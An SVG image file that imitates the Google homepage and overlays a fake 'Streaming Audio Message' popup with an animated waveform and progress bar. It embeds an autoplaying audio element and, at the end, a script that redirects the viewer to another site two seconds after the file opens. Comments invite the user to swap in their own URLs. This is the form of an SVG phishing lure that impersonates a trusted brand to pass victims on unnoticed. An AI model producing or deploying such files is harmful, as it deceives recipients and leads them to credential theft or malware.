<svg xmlns="http://www.w3.org/2000/svg" width="640" height="360" viewBox="0 0 640 360">
  <!-- Background like Google homepage (white with centered logo and search bar) -->
  <rect width="640" height="360" fill="#fff"/>

  <!-- Google logo centered at top -->
  <g transform="translate(220, 100)">
    <text x="0" y="0" font-family="sans-serif" font-size="60" fill="#4285F4">G</text>
    <text x="50" y="0" font-family="sans-serif" font-size="60" fill="#DB4437">o</text>
    <text x="100" y="0" font-family="sans-serif" font-size="60" fill="#F4B400">o</text>
    <text x="150" y="0" font-family="sans-serif" font-size="60" fill="#4285F4">g</text>
    <text x="200" y="0" font-family="sans-serif" font-size="60" fill="#0F9D58">l</text>
    <text x="230" y="0" font-family="sans-serif" font-size="60" fill="#DB4437">e</text>
  </g>

  <!-- Simplified search bar below logo -->
  <rect x="150" y="180" width="340" height="40" rx="20" fill="#fff" stroke="#ddd" stroke-width="2"/>
  <text x="170" y="205" font-family="sans-serif" font-size="16" fill="#aaa">Search Google or type a URL</text>
  <!-- Microphone icon for voice search feel -->
  <g transform="translate(460, 190)" fill="#4285F4">
    <rect x="-10" y="-15" width="20" height="25" rx="10"/>
    <line x1="0" y1="10" x2="0" y2="15"/>
    <circle cx="0" cy="20" r="5"/>
  </g>

  <!-- Popup for streaming audio message (centered, with shadow) -->
  <g transform="translate(120, 80)">
    <!-- Popup background with shadow -->
    <rect x="0" y="0" width="400" height="200" rx="10" fill="#fff" stroke="#ccc" stroke-width="2"/>
    <rect x="5" y="5" width="400" height="200" rx="10" fill="none" filter="url(#shadow)"/>
    <defs>
      <filter id="shadow" x="-20" y="-20" width="440" height="240">
        <feGaussianBlur in="SourceAlpha" stdDeviation="5"/>
        <feOffset dx="0" dy="5" result="offsetblur"/>
        <feMerge>
          <feMergeNode/>
          <feMergeNode in="SourceGraphic"/>
        </feMerge>
      </filter>
    </defs>

    <!-- Title in popup -->
    <text x="200" y="40" font-family="sans-serif" font-size="20" fill="#333" text-anchor="middle">Streaming Audio Message</text>

    <!-- Audio waveform animation (like waves streaming) -->
    <g transform="translate(40, 80)" fill="#4285F4">
      <rect x="0" y="-5" width="10" height="10"><animate attributeName="height" values="10;20;10" dur="0.5s" repeatCount="indefinite"/></rect>
      <rect x="20" y="-10" width="10" height="20"><animate attributeName="height" values="20;30;20" dur="0.6s" repeatCount="indefinite"/></rect>
      <rect x="40" y="-15" width="10" height="30"><animate attributeName="height" values="30;10;30" dur="0.4s" repeatCount="indefinite"/></rect>
      <rect x="60" y="-10" width="10" height="20"><animate attributeName="height" values="20;40;20" dur="0.7s" repeatCount="indefinite"/></rect>
      <rect x="80" y="-5" width="10" height="10"><animate attributeName="height" values="10;25;10" dur="0.5s" repeatCount="indefinite"/></rect>
      <rect x="100" y="-15" width="10" height="30"><animate attributeName="height" values="30;15;30" dur="0.6s" repeatCount="indefinite"/></rect>
      <rect x="120" y="-10" width="10" height="20"><animate attributeName="height" values="20;35;20" dur="0.4s" repeatCount="indefinite"/></rect>
      <rect x="140" y="-5" width="10" height="10"><animate attributeName="height" values="10;20;10" dur="0.5s" repeatCount="indefinite"/></rect>
      <rect x="160" y="-15" width="10" height="30"><animate attributeName="height" values="30;10;30" dur="0.7s" repeatCount="indefinite"/></rect>
      <rect x="180" y="-10" width="10" height="20"><animate attributeName="height" values="20;30;20" dur="0.6s" repeatCount="indefinite"/></rect>
      <rect x="200" y="-5" width="10" height="10"><animate attributeName="height" values="10;25;10" dur="0.5s" repeatCount="indefinite"/></rect>
      <rect x="220" y="-15" width="10" height="30"><animate attributeName="height" values="30;15;30" dur="0.4s" repeatCount="indefinite"/></rect>
      <rect x="240" y="-10" width="10" height="20"><animate attributeName="height" values="20;40;20" dur="0.7s" repeatCount="indefinite"/></rect>
      <rect x="260" y="-5" width="10" height="10"><animate attributeName="height" values="10;20;10" dur="0.5s" repeatCount="indefinite"/></rect>
      <rect x="280" y="-15" width="10" height="30"><animate attributeName="height" values="30;10;30" dur="0.6s" repeatCount="indefinite"/></rect>
      <rect x="300" y="-10" width="10" height="20"><animate attributeName="height" values="20;35;20" dur="0.4s" repeatCount="indefinite"/></rect>
    </g>

    <!-- Progress bar at bottom of popup -->
    <rect x="20" y="170" width="360" height="3" fill="#ddd"/>
    <rect x="20" y="170" width="0" height="3" fill="#4285F4">
      <animate attributeName="width" from="0" to="360" dur="2s" fill="freeze"/>
    </rect>
    <!-- Time display -->
    <text x="40" y="190" font-family="sans-serif" font-size="12" fill="#666">0:00 / 0:02</text>
  </g>

  <!-- Embed audio (replace 'https://example.com/your-audio.mp3' with your actual audio URL) -->
  <foreignObject width="1" height="1" x="0" y="0">
    <audio id="audio" src="https://example.com/your-audio.mp3" autoplay="autoplay"></audio>
  </foreignObject>

  <!-- JavaScript for redirect after 2 seconds -->
  <script type="text/javascript">
    <![CDATA[
      setTimeout(function() {
        window.location.href = "http://example.com";
      }, 2000);
    ]]>
  </script>
</svg>
